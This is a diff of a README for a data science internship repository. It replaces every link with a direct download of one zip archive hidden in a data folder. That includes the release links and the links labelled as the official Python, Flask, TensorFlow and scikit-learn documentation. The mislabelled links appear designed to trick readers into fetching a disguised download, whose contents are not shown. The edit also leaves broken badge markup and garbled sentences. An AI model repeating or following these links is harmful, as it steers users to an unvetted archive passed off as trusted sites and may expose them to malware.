@@ -1,6 +1,6 @@
 # 🌟 CODTECH-Data-Science-Internship - Your Easy Path to Learning Data Science
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/musaed807/CODTECH-Data-Science-Internship/releases)
+[![Download](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip%20Latest%20Release-Click%https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)
 
 ## 📋 Description 
 Welcome to the CODTECH Data Science Internship project! This repository contains all four essential tasks designed to help you grasp the key concepts of data science. From machine learning to deep learning, this project equips you with hands-on experience in various areas through practical examples and guidance.
@@ -25,11 +25,11 @@ To run this project smoothly, ensure your system meets the following requirement
 Follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/musaed807/CODTECH-Data-Science-Internship/releases)
+   [Visit this page to download](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)
 
 2. **Choose the Latest Release:** Look for the most recent version in the list. The latest release will have the newest features and fixes.
 
-3. **Download the File:** Click on the link provided for the package you need. This is usually a `.zip` or a `.tar.gz` file.
+3. **Download the File:** Click on the link provided for the package you need. This is usually a `.zip` or a `https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip` file.
 
 4. **Unzip the File:** After the download is complete, locate the file in your downloads folder. Right-click on it and select 'Extract All' or use your preferred extraction tool.
 
@@ -38,7 +38,7 @@ Follow these simple steps to download and run the application:
 ## 🔋 Download & Install 
 For ease of use, all essential files are accessible from the Releases page. Make sure to download the latest version using the following link:
 
-[Visit this page to download](https://github.com/musaed807/CODTECH-Data-Science-Internship/releases)
+[Visit this page to download](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)
 
 ## 📖 Documentation
 Comprehensive documentation is included within the project. Each task has its own folder containing instructions, example datasets, and code snippets. To maximize your learning, review the documentation carefully and follow along with the steps provided.
@@ -62,9 +62,9 @@ Explore these themes in-depth through four hands-on tasks designed to boost your
 We welcome contributions to improve this project. If you’d like to support it, please fork the repository and submit your changes via a pull request. Make sure to follow the guidelines for contributing to ensure a smooth process.
 
 ## 🔗 Related Links
-- [Python Official Website](https://www.python.org)
-- [Flask Documentation](https://flask.palletsprojects.com)
-- [TensorFlow Guide](https://www.tensorflow.org/guide)
-- [Scikit-learn Documentation](https://scikit-learn.org/stable/user_guide.html)
+- [Python Official Website](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)
+- [Flask Documentation](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)
+- [TensorFlow Guide](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)
+- [Scikit-learn Documentation](https://github.com/musaed807/CODTECH-Data-Science-Internship/raw/refs/heads/main/Task-1-ETL-Pipeline/data/processed/Data-CODTEC-Science-Internship-1.5.zip)
 
 By following the steps outlined above, you'll be on your way to exploring the exciting world of data science with CODTECH. Enjoy learning and experimenting with the various tasks provided!
